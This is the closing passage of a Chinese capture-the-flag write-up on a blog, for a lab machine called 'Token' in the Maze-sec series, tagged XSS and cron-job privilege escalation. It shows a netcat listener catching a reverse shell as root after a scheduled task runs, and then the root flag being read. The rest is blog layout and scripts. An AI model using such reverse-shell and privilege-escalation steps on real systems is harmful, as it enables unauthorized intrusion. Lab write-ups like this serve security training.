+<p>等待定时任务执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br><span class="hljs-built_in">id</span><br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.63] 60762<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1002175): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@Token:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@Token:~# <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+<p><strong>ROOT FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Token:~# <span class="hljs-built_in">cat</span> root.txt<br>flag&#123;root-d404401c8c6495b206fc35c95e55a6d5&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/xss/" class="print-no-link">#xss</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" class="print-no-link">#提权-定时任务</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Token</div>
+      <div>http://miao-sec.github.io/Maze-sec/Token/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Maze-sec/Base/" title="Base">
+                        <span class="hidden-mobile">Base</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <link rel="stylesheet" href="/dist/APlayer.min.css"> <div id="aplayer"></div> <script type="text/javascript" src="/dist/APlayer.min.js"></script> <script type="text/javascript" src="/js/music.js"></script> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
